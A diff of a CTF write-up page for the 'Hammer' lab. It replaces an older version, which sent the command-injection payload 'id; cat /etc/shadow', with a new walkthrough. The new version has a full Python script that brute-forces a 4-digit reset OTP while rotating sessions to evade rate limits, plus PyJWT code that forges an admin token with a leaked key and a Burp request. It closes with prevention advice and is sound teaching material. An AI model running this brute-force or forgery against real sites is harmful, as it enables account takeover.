@@ -69,11 +69,14 @@
       <!-- Tags -->
       <div class="writeup-tags">
         <span class="writeup-tag">Brute Force</span>
-        <span class="writeup-tag">API Abuse</span>
         <span class="writeup-tag">RCE</span>
         <span class="writeup-tag">Auth Bypass</span>
         <span class="writeup-tag">Apache</span>
-        <span class="writeup-tag">Jetty</span>
+        <span class="writeup-tag">ffuf</span>
+        <span class="writeup-tag">OTP</span>
+        <span class="writeup-tag">JWT</span>
+        <span class="writeup-tag">kid</span>
+        <span class="writeup-tag">Burp</span>
         <span class="writeup-tag">Web</span>
         <span class="writeup-tag">Enumeration</span>
       </div>
@@ -83,47 +86,232 @@
       <!-- Writeup body (rendered from Markdown) -->
       <article class="writeup-body">
         <h2>Overview</h2>
-<p>Hammer is an intermediate-difficulty web-focused machine. It presents a modern web application with multiple layers of authentication bypass and API abuse leading to full compromise.</p>
+<p>Hammer is a medium web challenge that chains together weak account recovery (a 4-digit OTP), information leakage through exposed log files, and JWT abuse via a controllable <code>kid</code> value to escalate from a normal user to an admin capable of command execution.</p>
 <h2>Reconnaissance</h2>
 <h3>Nmap Scan</h3>
 <pre><code>$ nmap -sC -sV -oN nmap/hammer 10.10.11.xx
-PORT    STATE SERVICE VERSION
-80/tcp  open  http    Apache/2.4.54
-443/tcp open  ssl     Apache/2.4.54
-8080/tcp open http    Jetty 9.4.48
+PORT    STATE SERVICE
+1337/tcp open  http
 </code></pre>
-<p>The box runs Apache with HTTPS on the standard ports and a Jetty application server on 8080.</p>
+<p>The web app is served over HTTP on port 1337.</p>
 <h3>Directory Enumeration</h3>
-<pre><code>$ feroxbuster -u https://10.10.11.xx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
-200  GET  /api/v1/
-200  GET  /api/v1/docs
-302  GET  /admin → /login
-200  GET  /static/js/app.js
+<p>The landing page source contained a helpful comment:</p>
+<pre><code>&lt;!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME --&gt;
 </code></pre>
-<p>The API documentation endpoint at <code>/api/v1/docs</code> reveals the full REST API schema including authentication endpoints.</p>
+<p>With that hint, I fuzzed directories using <code>ffuf</code>:</p>
+<pre><code>ffuf -u http://10.10.118.103:1337/hmr_FUZZ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -mc 200,301
+</code></pre>
+<p>This reveals <code>/hmr_logs</code> which contains <code>error.logs</code> (Apache error logs). Inside was a valid email address:</p>
+<ul>
+<li><code>tester@hammer.thm</code></li>
+</ul>
+<p>Before finding the email in logs, I checked whether the login page allowed username enumeration. It did not — the error message is static:</p>
+<blockquote>
+<p>&quot;user OR password is wrong&quot;</p>
+</blockquote>
 <h2>Exploitation</h2>
-<h3>Authentication Bypass</h3>
-<p>The password reset flow uses a predictable 4-digit token sent via email. By brute-forcing the token within the rate limit window:</p>
-<pre><code>$ python3 brute_reset.py --target https://10.10.11.xx \
-  --user admin@hammer.htb --range 0000-9999 --threads 20
-</code></pre>
-<h3>API Abuse</h3>
-<p>Once authenticated, the API exposes an endpoint for executing &quot;health checks&quot; that accepts arbitrary commands via the <code>cmd</code> parameter:</p>
-<pre><code>POST /api/v1/health HTTP/1.1
-Authorization: Bearer eyJ...
-Content-Type: application/json
+<h3>Initial Access</h3>
+<p>With a valid email address from the exposed logs, the next step is the password reset flow at:</p>
+<ul>
+<li><code>/reset_password.php</code></li>
+</ul>
+<p>The reset mechanism relies on a <strong>4-digit OTP</strong> (0000–9999). Even with basic session/rate controls, it’s still brute-forceable by rotating sessions and pacing requests.</p>
+<p>Script used (<code>OTP_pin_brute.py</code>):</p>
+<pre><code>import requests
+import itertools
+import time
+import random
+from datetime import datetime
 
-{&quot;cmd&quot;: &quot;id; cat /etc/shadow&quot;}
+BASE_URL = &quot;http://10.67.172.249:1337&quot;
+RESET_ENDPOINT = &quot;/reset_password.php&quot;
+
+EMAIL = &quot;tester@hammer.thm&quot;
+CODE_LENGTH = 4
+
+# Rate control
+REQUEST_DELAY = (0.8, 1.5)      # hotspot‑safe
+SESSION_ROTATE_DELAY = 2.5
+
+def log(msg):
+  ts = datetime.now().strftime(&quot;%H:%M:%S&quot;)
+  print(f&quot;[{ts}] {msg}&quot;)
+
+def start_new_session():
+  session = requests.Session()
+
+  # Initial page hit → PHPSESSID
+  session.get(BASE_URL + RESET_ENDPOINT)
+
+  # Trigger email / OTP generation
+  session.post(
+    BASE_URL + RESET_ENDPOINT,
+    data={&quot;email&quot;: EMAIL},
+    allow_redirects=True
+  )
+
+  sid = session.cookies.get(&quot;PHPSESSID&quot;)
+  log(f&quot;[NEW SESSION] PHPSESSID={sid}&quot;)
+
+  return session, sid
+
+def is_real_success(response):
+  &quot;&quot;&quot;
+  Define success as:
+  - recovery form no longer present
+  OR
+  - new password form present
+  &quot;&quot;&quot;
+
+  text = response.text.lower()
+
+  if &quot;enter recovery code&quot; not in text:
+    return True
+
+  if &quot;new password&quot; in text and &quot;recovery code&quot; not in text:
+    return True
+
+  return False
+
+def brute_force():
+  codes = (
+    &quot;&quot;.join(code)
+    for code in itertools.product(&quot;0123456789&quot;, repeat=CODE_LENGTH)
+  )
+
+  session, current_sid = start_new_session()
+
+  for code in codes:
+    log(f&quot;Trying code {code} | SID={current_sid}&quot;)
+
+    response = session.post(
+      BASE_URL + RESET_ENDPOINT,
+      data={&quot;recovery_code&quot;: code},
+      allow_redirects=True
+    )
+
+    # Detect PHPSESSID rotation
+    new_sid = session.cookies.get(&quot;PHPSESSID&quot;)
+    if new_sid != current_sid:
+      log(f&quot;[SID ROTATION] {current_sid} → {new_sid}&quot;)
+      current_sid = new_sid
+
+    # Read server rate‑limit if present
+    remaining = response.headers.get(&quot;Rate-Limit-Pending&quot;)
+    if remaining is not None:
+      log(f&quot;Attempts left in session: {remaining}&quot;)
+
+    # REAL success check
+    if is_real_success(response):
+      log(&quot;OTP ACCEPTED&quot;)
+      log(f&quot;VALID CODE: {code}&quot;)
+      log(f&quot;FINAL PHPSESSID: {current_sid}&quot;)
+      log(f&quot;FINAL URL: {response.url}&quot;)
+
+      # Optional: dump page title snippet
+      title_start = response.text.lower().find(&quot;&lt;title&gt;&quot;)
+      title_end = response.text.lower().find(&quot;&lt;/title&gt;&quot;)
+      if title_start != -1 and title_end != -1:
+        log(f&quot;PAGE TITLE: {response.text[title_start+7:title_end]}&quot;)
+
+      return
+
+    # Rotate session if rate‑limited
+    if remaining is not None and int(remaining) &lt;= 0:
+      log(&quot;Rate limit hit → rotating session&quot;)
+      session.close()
+      time.sleep(SESSION_ROTATE_DELAY)
+      session, current_sid = start_new_session()
+      continue
+
+    time.sleep(random.uniform(*REQUEST_DELAY))
+
+  log(&quot;All combinations exhausted&quot;)
+
+if __name__ == &quot;__main__&quot;:
+  brute_force()
 </code></pre>
-<h3>Privilege Escalation</h3>
-<p>The web application runs as a service user. Examining the Jetty configuration reveals credentials for the management interface on port 8080, which runs as root.</p>
+<p>What this script does (and why it works):</p>
+<ul>
+<li>Creates a fresh session (<code>requests.Session</code>) to obtain a <code>PHPSESSID</code>.</li>
+<li>Triggers OTP generation for the target email.</li>
+<li>Iterates through all 4-digit codes while sleeping between requests to avoid tripping basic defenses.</li>
+<li>Detects session rotation and watches the server’s <code>Rate-Limit-Pending</code> header (when present).</li>
+<li>If rate limited, it rotates to a new session and continues.</li>
+<li>Detects success by checking page content (recovery form disappears / new password form appears) rather than relying only on status codes.</li>
+</ul>
+<p>After the OTP is accepted and the password is reset, I logged in as the user. It drops you on <code>/execute_command.php</code> which contains a command input box.</p>
+<p>The command execution is very restricted: <code>ls</code> works and lists directory contents, but most other commands (like <code>cat</code>) are blocked. The app also auto-logoffs you again after a short time.</p>
+<h3>Privilege Escalation &amp; RCE</h3>
+<p>After logging in, the app issues a JWT containing a claim like <code>role: user</code>. The JWT header includes a <code>kid</code> value that points at a file path.</p>
+<p>I inspected and modified the token using <code>jwt.io</code> (you can also do this programmatically with PyJWT).</p>
+<p>From the command box, running <code>ls</code> revealed a signing key file in the web root:</p>
+<ul>
+<li><code>188ade1.key</code></li>
+</ul>
+<p>Because it’s in the web root, it’s directly downloadable:</p>
+<ul>
+<li><code>http://hammer.thm/188ade1.key</code></li>
+</ul>
+<p>Key contents (<code>adekey</code>):</p>
+<pre><code>56058354efb3daa97ebab00fabd7a7d7
+</code></pre>
+<p>With that key, we can forge a new JWT:</p>
+<ul>
+<li>In the <strong>payload</strong>, change <code>role</code> to <code>admin</code></li>
+<li>In the <strong>header</strong>, set <code>kid</code> to the discovered key path/name</li>
+<li>Sign the token with the downloaded key</li>
+</ul>
+<p>Example forging with PyJWT:</p>
+<pre><code>import jwt
+
+
+KEY = open(&quot;188ade1.key&quot;, &quot;rb&quot;).read()
+payload = {&quot;role&quot;: &quot;admin&quot;}
+headers = {&quot;kid&quot;: &quot;188ade1.key&quot;}
+
+token = jwt.encode(payload, KEY, algorithm=&quot;HS256&quot;, headers=headers)
+print(token)
+</code></pre>
+<p>Finally, I sent the forged token in Burp by adding an Authorization header when posting to the command endpoint:</p>
+<pre><code>POST /execute_command.php HTTP/1.1
+Host: hammer.thm
+Authorization: Bearer &lt;FORGED_JWT_HERE&gt;
+Content-Type: application/x-www-form-urlencoded
+
+command=id
+</code></pre>
+<p>With the admin JWT, the endpoint returns the flag and the lab is complete.</p>
 <h2>Flags</h2>
 <ul>
 <li><strong>User:</strong> <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></li>
 <li><strong>Root:</strong> <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></li>
 </ul>
 <h2>Lessons Learned</h2>
-<p>Rate limiting must be enforced on authentication and password reset flows. API endpoints should never accept raw system commands, and management interfaces must be properly isolated.</p>
+<p>Rate limiting and lockouts matter for any OTP-based recovery flow. Additionally, JWT <code>kid</code> handling should never allow attacker-controlled filesystem lookups, and secrets/signing keys should not be discoverable from within application features.</p>
+<h2>JWT primer (short)</h2>
+<p>A JWT is three Base64URL-encoded parts separated by dots:</p>
+<p><code>header.payload.signature</code></p>
+<ul>
+<li><strong>Header</strong>: metadata like the signing algorithm (<code>alg</code>) and token type (<code>typ</code>). In this box it also included a dangerous <code>kid</code> header that the server treated like a file path.</li>
+<li><strong>Payload</strong>: claims (e.g., <code>role: user</code>, <code>exp</code>, <code>iat</code>, <code>iss</code>, <code>aud</code>).</li>
+<li><strong>Signature</strong>: proves the token was signed by the server’s key/secret.</li>
+</ul>
+<p>Example forged JWT used in this lab:</p>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcwNTg0MDIzLCJleHAiOjE3NzA1ODc2MjMsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.3cm0ELDW_cOvXgbJkwh94XZPG7APVRECxWCEkjV9P0A
+</code></pre>
+<h2>How this should have been prevented</h2>
+<p>Built-in JWT library validation + common best practices would have stopped this chain:</p>
+<ul>
+<li><strong>Never load signing keys from attacker-controlled <code>kid</code> values</strong>. Use a server-side allowlist/map (<code>kid</code> → key) or ignore <code>kid</code> entirely.</li>
+<li><strong>Store signing secrets outside web root</strong> and outside any feature that can list/download files.</li>
+<li><strong>Enforce algorithm expectations</strong> by pinning <code>alg</code> server-side and rejecting <code>none</code>.</li>
+<li><strong>Validate required claims</strong> (<code>exp</code>, <code>iss</code>, <code>aud</code>) and reject tokens that don’t match expectations.</li>
+<li><strong>Rate-limit/lock out OTP verification</strong> per account and per IP, and invalidate OTPs after a small number of attempts.</li>
+</ul>
+<p>I recommend visiting this room in TryHackMe, that goes into JWT security in detail: <a href="https://tryhackme.com/room/jwtsecurity">https://tryhackme.com/room/jwtsecurity</a></p>
 
       </article>
     </div>
